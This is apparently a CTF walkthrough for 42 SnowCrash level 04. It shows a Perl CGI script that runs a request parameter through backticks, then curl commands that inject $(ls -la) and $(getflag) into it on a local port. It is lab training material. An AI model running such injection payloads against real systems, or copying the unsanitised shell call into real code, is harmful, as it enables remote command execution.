---
title: 42 SnowCrash level04 - Walkthrough 👾 
tags:
  - ctf
  - cgi
  - perl
  - exploit
  - command-injection
  - web
  - 42project
categories:
  - ctfs
  - 42project
date: 2024-05-18 14:37:32
---

![snowcrash](/images/snowcrash.png)

## Introduction

In level 04, we encountered a Perl CGI script (`level04.pl`) vulnerable to command injection. By manipulating the input parameter, we were able to execute arbitrary commands on the server.

### Perl CGI Code

```perl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
}
x(param("x"));
```

### Vulnerability

The Perl script listens on port 4747 and accepts an "x" parameter via HTTP GET requests. It then directly echoes the parameter value without proper sanitization, leading to command injection.

### Exploitation

1. **Testing the Script**
   We tested the script by providing simple input:
   ```sh
   curl -d x="test" http://127.0.0.1:4747
   ```
2. Result: test

    Exploiting Command Injection
    We injected commands to list files in the directory:
    ```shell
    curl -d x="\$(ls -la)" http://127.0.0.1:4747
    ```
    Result: Directory listing displayed.
3. Obtaining the Flag
    Finally, we executed getflag to retrieve the flag:
    ```shell
    curl -d x="\$(getflag)" http://127.0.0.1:4747
    ```

# Conclusion

By exploiting the command injection vulnerability in the Perl CGI script, we successfully executed arbitrary commands on the system, ultimately obtaining the flag for level 04.
